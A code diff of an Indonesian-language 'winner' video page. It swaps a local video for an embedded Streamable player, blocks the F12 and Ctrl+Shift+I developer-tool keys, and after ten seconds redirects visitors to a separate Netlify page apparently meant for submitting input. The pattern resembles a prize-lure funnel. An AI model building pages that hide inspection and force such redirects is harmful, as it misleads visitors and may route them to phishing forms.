@@ -19,7 +19,7 @@
     }
 
     body {
-      background-image: url('yellow.jpg'); /* Ganti dengan foto kamu */
+      background-image: url('yellow.jpg');
       background-size: cover;
       background-position: center;
       display: flex;
@@ -43,10 +43,9 @@
       box-shadow: 0 0 30px 12px yellow;
       overflow: hidden;
       display: none;
-      pointer-events: none;
     }
 
-    video {
+    iframe {
       border-radius: 20px;
       width: 640px;
       height: 360px;
@@ -78,18 +77,19 @@
   <button id="playBtn">Putar Video</button>
 
   <div class="video-box" id="videoContainer">
-    <video id="winnerVideo" playsinline>
-      <source src="22.mp4" type="video/mp4">
-      Your browser does not support the video tag.
-    </video>
+    <iframe id="streamFrame"
+      src=""
+      frameborder="0"
+      allow="autoplay"
+      allowfullscreen>
+    </iframe>
   </div>
 
   <script>
     const playBtn = document.getElementById("playBtn");
-    const video = document.getElementById("winnerVideo");
     const videoContainer = document.getElementById("videoContainer");
+    const iframe = document.getElementById("streamFrame");
 
-    // Coba blokir keyboard inspect
     document.addEventListener('keydown', function(e) {
       if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
         e.preventDefault();
@@ -97,25 +97,17 @@
       }
     });
 
-    playBtn.addEventListener("click", async () => {
-      // Masuk ke fullscreen
-      if (document.documentElement.requestFullscreen) {
-        await document.documentElement.requestFullscreen();
-      }
-
-      // Tampilkan video
+    playBtn.addEventListener("click", () => {
+      // Tampilkan video iframe
+      iframe.src = "https://streamable.com/e/ac4eg0?autoplay=1";
       videoContainer.style.display = "block";
       playBtn.style.display = "none";
-      video.volume = 1.0;
-      video.play().catch(err => {
-        alert("Autoplay gagal: " + err);
-      });
+
+      // Setelah video selesai (misal 10 detik), redirect
+      setTimeout(() => {
+        window.location.href = "https://68727332e83ac442454be14e--masukan-xc.netlify.app/";
+      }, 10000); // <-- Ganti 10000 (10 detik) dengan durasi video kamu
     });
-
-   video.addEventListener("ended", () => {
-  window.location.href = "https://68727332e83ac442454be14e--masukan-xc.netlify.app/";
-});
-
   </script>
 
 </body>
